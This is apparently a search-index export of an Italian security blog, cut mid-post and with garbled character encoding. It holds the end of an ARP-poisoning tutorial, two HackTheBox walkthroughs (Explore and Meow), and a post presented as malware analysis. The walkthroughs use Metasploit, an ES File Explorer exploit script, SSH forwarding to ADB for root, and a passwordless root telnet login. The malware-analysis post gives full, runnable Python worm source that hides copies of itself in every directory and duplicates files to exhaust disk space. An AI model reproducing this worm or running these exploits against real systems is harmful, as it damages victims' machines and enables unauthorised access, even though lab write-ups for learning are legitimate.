importato, avviamo lo script con:\nsudo python3 arper.py [IP vittima] [IP gateway] [interface] Ad esempio:\nsudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0 Lâ€™output durante lâ€™attacco:\n? (192.168.1.1) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 ? (192.168.1.176) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 Si vede che la vittima malcapitata ha una cache ARP compromessa, poichÃ¨ il gateway risulta avere lo stesso indirizzo MAC dellâ€™attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.\nCome prevenire L\u0026rsquo;ARP Poisoning con DAI L\u0026rsquo;ispezione ARP dinamica (DAI) Ã¨ una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi. La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini. Il malintenzionato invia richieste o risposte ARP mappando l\u0026rsquo;indirizzo IP di un\u0026rsquo;altra stazione al proprio indirizzo MAC.\nDAI si basa sullo snooping DHCP. Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).\nQuando DAI Ã¨ abilitato, lo switch elimina il pacchetto ARP se l\u0026rsquo;indirizzo MAC e l\u0026rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP. Tuttavia, puÃ² essere superato attraverso mappature statiche. I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non puÃ² essere eseguito o altri switch nella rete non eseguono l\u0026rsquo;ispezione ARP dinamica. Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/","tags":["Protocollo ARP","ARP Poisoning","Python","Scapy","DAI"],"title":"Introduzione All'ARP Poisoning"},{"categories":["Tutorial","Malware Analysis"],"contents":"Table Of Contents:\n Cos\u0026rsquo;Ã¨ un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual\u0026rsquo;Ã¨ il funzionamento di un virus, quali danni puÃ² comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, Ã¨ la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos\u0026rsquo;Ã¨ un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.\nCos\u0026rsquo;Ã¨ un Worm Un worm Ã¨ un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilitÃ  nelle reti. A differenza di un virus, che richiede l\u0026rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l\u0026rsquo;infezione iniziale dell\u0026rsquo;host, non richiedono la partecipazione dell\u0026rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.\nI worm condividono schemi simili: sfruttano le vulnerabilitÃ  del sistema, hanno un modo per propagarsi e contengono tutti codice dannoso (payload) per causare danni ai sistemi o alle reti dei computer. I worm sono responsabili di alcuni degli attacchi piÃ¹ devastanti su Internet. Nel 2001, il worm Code Red aveva infettato oltre 300.000 server in sole 19 ore.\nAlcune persone pensano che un worm informatico e un virus informatico siano la stessa cosa perchÃ© i due si comportano in modo simile. Potrebbero persino usare termini come \u0026ldquo;worm computer virus\u0026rdquo; o \u0026ldquo;worm virus malware\u0026rdquo;. La veritÃ  Ã¨ che i due sono minacce comparabili ma diverse.\nLa differenza fondamentale tra un virus e un worm Ã¨ che i virus si basano sull\u0026rsquo;azione umana per l\u0026rsquo;attivazione e hanno bisogno di un sistema host per replicarsi. In altre parole, un virus non danneggerÃ  il tuo sistema a meno che tu non lo esegua. Ad esempio, un virus su un\u0026rsquo;unitÃ  flash collegata al tuo computer non danneggerÃ  il tuo sistema a meno che tu non lo attivi. E come accennato in precedenza, un worm non ha bisogno di un sistema host o di un\u0026rsquo;azione dell\u0026rsquo;utente per diffondersi.\nNel corso degli anni, ci sono stati alcuni vermi particolarmente devastanti. Alcuni vermi hanno causato miliardi di danni. Ecco un breve elenco di alcuni famigerati:\n Morris Worm: noto anche come Internet worm, questo Ã¨ stato uno dei primi worm informatici a diffondersi tramite Internet e guadagnare notorietÃ  nei media. Bagle: noto anche come Beagle, Mitglieder e Lodeight, questo worm di mailing di massa aveva molte varianti. Blaster: noto anche come MSBlast, Lovesan e Lovsan, questo worm ha attaccato i computer con Windows XP e Windows 2000. Conficker: noto anche come Downup, Downadup e Kido, questo worm ha sfruttato i difetti di Windows per infettare milioni di computer in oltre cento paesi. ILOVEYOU: Il worm ILOVEYOU ha infettato decine di milioni di computer in tutto il mondo, causando danni per miliardi di dollari. Mydoom: questo Ã¨ diventato il worm di posta elettronica a piÃ¹ rapida diffusione nel 2004, inviando posta indesiderata attraverso i computer. Ryuk: Sebbene Ryuk non sia sempre stato un worm, ora Ã¨ un ransomware simile a un worm. SQL Slammer: il worm SQL Slammer ha guadagnato fama per aver rallentato il traffico Internet con attacchi denial-of-service su alcuni host Internet. Storm Worm: questo worm ha utilizzato l\u0026rsquo;ingegneria sociale con notizie false di una tempesta disastrosa per lanciare botnet su macchine compromesse. Stuxnet: alcuni esperti ritengono che questo sofisticato worm sia stato sviluppato per anni per lanciare un attacco informatico.  Molti dei sintomi di un worm informatico sono simili a quelli di un virus informatico. Ad esempio, potresti avere un worm se il tuo computer rallenta, si blocca, si blocca o genera messaggi di errore. Potresti anche notare che i file sono mancanti o danneggiati o che lo spazio sul tuo disco rigido si sta rapidamente esaurendo inspiegabilmente. Inoltre, potresti ricevere avvisi dal tuo firewall su una violazione.\nCome altre forme di malware, i worm informatici possono essere fermati con il giusto software antivirus e antimalware e pratiche informatiche sicure. Si prega di non intrattenere collegamenti sospetti, e-mail, testi, messaggi, siti Web, reti di file P2P e unitÃ . Inoltre, aggiorna regolarmente il tuo software essenziale per proteggere il tuo computer da vulnerabilitÃ  come il difetto di Windows wormable e simili.\nScrivere un worm in Python Il worm Ã¨ un tipo di malware che replica se stesso e altri file per consumare spazio nei nostri dischi rigidi. Potresti scoprire che le tue unitÃ  o partizioni si riempiono senza alcun motivo visibile e ciÃ² potrebbe accadere a causa di un worm.\nUn worm Ã¨ diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).\nAvremo bisogno di due moduli per scrivere un worm. Qui, os Ã¨ il modulo piÃ¹ importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.\nshutil Ã¨ usato per copiare il contenuto del file. Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().\nimport os import shutil Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.\nclass Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) Qui abbiamo tre argomenti:\n path: definisce dove iniziare a cercare le directory (l\u0026rsquo;impostazione predefinita Ã¨ la directory principale /) target_dir_list: l\u0026rsquo;utente puÃ² passare un elenco di directory di destinazione iniziali. Per impostazione predefinita Ã¨ un elenco vuoto [] iteration: Ho usato questo parametro per definire quante istanze creerÃ  il worm per ogni file esistente in una directory (il valore predefinito Ã¨ 2 solo a scopo di test, puoi aumentare o diminuire il numero, o meglio fornire valur durante la creazione di un oggetto della classe)  Il primo metodo di cui abbiamo bisogno Ã¨ elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.\nQui, sto evitando i file nascosti poichÃ© include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS). A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.\ndef list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.\ndef create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) Il seguente metodo verrÃ  utilizzato per duplicare i file il numero di volte il valore che abbiamo dall\u0026rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.\ndef copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierÃ  tutte le azioni in sequenza.\ndef start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() Ora, creiamo la nostra funzione principale ed eseguiamo il codice:\nif __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(\u0026quot;\u0026quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.\nEcco il codice completo:\nimport os import shutil class Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = target_dir_list if isinstance(target_dir_list, type(None)): self.iteration = 2 else: self.iteration = iteration # get own absolute path self.own_path = os.path.realpath(__file__) def list_directories(self,path): self.target_dir_list.append(path) files_in_current_directory = os.listdir(path) for file in files_in_current_directory: # avoid hidden files/directories (start with dot (.)) if not file.startswith(\u0026#39;.\u0026#39;): # get the full path absolute_path = os.path.join(path, file) print(absolute_path) if os.path.isdir(absolute_path): self.list_directories(absolute_path) else: pass def create_new_worm(self): for directory in self.target_dir_list: destination = os.path.join(directory, \u0026#34;.worm.py\u0026#34;) # copy the script in the new directory with similar name shutil.copyfile(self.own_path, destination) def copy_existing_files(self): for directory in self.target_dir_list: file_list_in_dir = os.listdir(directory) for file in file_list_in_dir: abs_path = os.path.join(directory, file) if not abs_path.startswith(\u0026#39;.\u0026#39;) and not os.path.isdir(abs_path): source = abs_path for i in range(self.iteration): destination = os.path.join(directory,(\u0026#34;.\u0026#34;+file+str(i))) shutil.copyfile(source, destination) def start_worm_actions(self): self.list_directories(self.path) print(self.target_dir_list) self.create_new_worm() self.copy_existing_files() if __name__==\u0026#34;__main__\u0026#34;: current_directory = os.path.abspath(\u0026#34;\u0026#34;) worm = Worm(path=current_directory) worm.start_worm_actions() Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:\nEseguiamo il worm 2 volte con il comando:\npython3 worm.py Ecco il risultato:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/","tags":["Malware Analysis","Malware","Worm","Python"],"title":"Scrivere un Worm in Python"},{"categories":["Walkthrough HackTheBox"],"contents":"Table of Contents:\n Enumerazione con Nmap Analisi delle porte  Sfruttamento dellâ€™Exploit con Metasploit Sfruttamento dellâ€™Exploit con CVE (Script Python)   Privilage Escalation   Explore Ã¨ una macchina Android di facile difficoltÃ . Lâ€™enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Unâ€™ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo cosÃ¬ lâ€™accesso remoto alla macchina. Infine, lâ€™aggressore Ã¨ in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite lâ€™Android Debug Bridge (ADB). Questa eventualitÃ  consente allâ€™utente malintenzionato di eseguire comandi come utente root.\nEnumerazione con Nmap Eseguiamo lâ€™enumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:\n1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) 2. nmap -p$ports -sC -sV [address] Lâ€™output sarÃ :\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 09:58 EST Nmap scan report for explore (10.10.10.247) Host is up (0.039s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 7190e3a7c95d836634883debb4c788fb (RSA) 5555/tcp filtered freeciv 34245/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.93%I=7%D=11/29%Time=63861E0F%P=x86_64-pc-linux-gnu%r(N SF:ULL,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port34245-TCP:V=7.93%I=7%D=11/29%Time=63861E0E%P=x86_64-pc-linux-gnu%r( SF:GenericLines,AA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2 SF:029\\x20Nov\\x202022\\x2014:59:13\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n SF:\\r\\nInvalid\\x20request\\x20line:\\x20\u0026#34;)%r(GetRequest,5C,\u0026#34;HTTP/1\\.1\\x20412 SF:\\x20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014: SF:59:13\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,B5,\u0026#34;HTTP/1 SF:\\.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\ SF:x2014:59:18\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x SF:20supported:\\x20OPTIONS\u0026#34;)%r(RTSPRequest,BB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:18\\x20GMT\\r\\nCon SF:tent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\ SF:r\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version SF::\\x20\\x20RTSP/1\\.0\u0026#34;)%r(Help,AE,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length: SF:\\x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\u0026#34;)%r(SSLSessionRe SF:q,DD,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\ SF:x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid SF:\\x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\ SF:?\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?\u0026lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\u0026#34;)%r(TerminalS SF:erverCookie,CA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x20 SF:29\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mst SF:shash=nmap\u0026#34;)%r(TLSSessionReq,DB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\n SF:Date:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length SF::\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnecti SF:on:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\ SF:0e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds Analisi delle porte Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso Ã© 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:\nQuesto sito web mostra le assegnazioni delle porte e le vulnerabilitÃ  note.\nNello snippet di cui sopra possiamo vedere che la porta 5555 Ã¨ utilizzata da Android Debug Bridge (ADB). Android Debug Bridge (adb) Ã¨ uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android. Dato che la porta 5555 Ã¨ filtrata e non Ã¨ possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:\nQuesta porta Ã¨ utilizzata dallâ€™applicazione ES File Explorer File Manager per Android, secondo questo sito web. Questo sito web indica anche una vulnerabilitÃ  nota per questa applicazione, in cui un utente malintenzionato Ã¨ in grado di eseguire comandi arbitrari sullâ€™host. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.\nSfruttamento dellâ€™Exploit con Metasploit La ricerca nel framework metasploit rivela un modulo per questa vulnerabilitÃ :\n1. msfconsole 2. search es file explorer  Il modulo di interesse Ã¨:\n# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Port Utilizziamo questo modulo ed elenchiamo le sue opzioni:\n1. use auxiliary/scanner/http/es_file_explorer_open_port 2. options  Successivamente, si imposta il parametro RHOSTS con lâ€™IP dellâ€™host e si digita exploit:\n1. set RHOSTS 10.10.10.247 2. exploit  Il risultato Ã¨ positivo. Lâ€™azione del parametro Ã¨ stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi lâ€™uscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.\nshow actions  Impostando lâ€™azione su LISTPICS, si ottengono i seguenti risultati.\n1. set action LISTPICS 2. exploit  Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo lâ€™azione su GETFILE e scarichiamo il file creds.jpg:\n1. set action GETFILE 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg 3. exploit  Successivamente, possiamo aprire lâ€™immagine utilizzando il visualizzatore di immagini feh:\n1. sudo apt install feh 2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg Sfruttamento dellâ€™Exploit con CVE (Script Python) Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:\nSalviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per lâ€™accesso ai dati nel telefono cellulare dellâ€™utente e lâ€™esecuzione dellâ€™applicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo lâ€™exploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quellâ€™exploit:\npython3 [script].py --cmd GetDeviceInfo --ip [address]  Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:\npython3 [script].py listPics [address]  Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. Câ€™Ã¨ un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:\npython3 [script].py getFile [address] /storage/emulated/0/DCIM/creds.jpg  Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:\nQuesto sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per lâ€™utente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.\nssh kristi@10.10.10.247 -p 2222  La flag user.txt si trova in /storage/emulated/0/user.txt:\nPrivilage Escalation Avendo accesso allâ€™host remoto tramite SSH, si puÃ² eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:\nss -ntpl PoichÃ© la porta 5555 Ã¨ filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:\n1. sudo apt install adb 2. adb --help Nella sezione rete vediamo che utilizzando lâ€™istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:\nadb connect 127.0.0.1:5555  Ãˆ possibile elencare i dispositivi collegati eseguendo il seguente comando:\nadb devices  Quindi, si puÃ² digitare quanto segue per ottenere la shell sulla macchina remota:\nadb -s 127.0.0.1 shell Digitiamo â€œsuâ€ per diventare utenti root:\nNella directory data vi sarÃ¡ la nostra flag:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/","tags":["CTF","HackTheBox","Walkthrough","Android","Metasploit","CVE"],"title":"Walkthrough Explore"},{"categories":["Walkthrough HackTheBox"],"contents":"Table Of Contents:\n Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa Ã¨ stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.\nIl comando Ã©:\nnmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L\u0026rsquo;output:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.129.46.55 Host is up (0.046s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Connessione a Telnet Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.\nUsa il comando:\nsudo apt-get install telnet se non lo hai installato o stai usando una VM, poi lanciamo:\ntelnet [address] L\u0026rsquo;output sarÃ :\nCi viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nellâ€™attivitÃ  precedente. Un utente root Ã¨ in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto lâ€™accesso.\nConfermiamo nel terminale se siamo lâ€™utente root.\nSe elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt Ã¨ elencato.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/","tags":["CTF","HackTheBox","Walkthrough","Telnet"],"title":"Walkthrough Meow"}]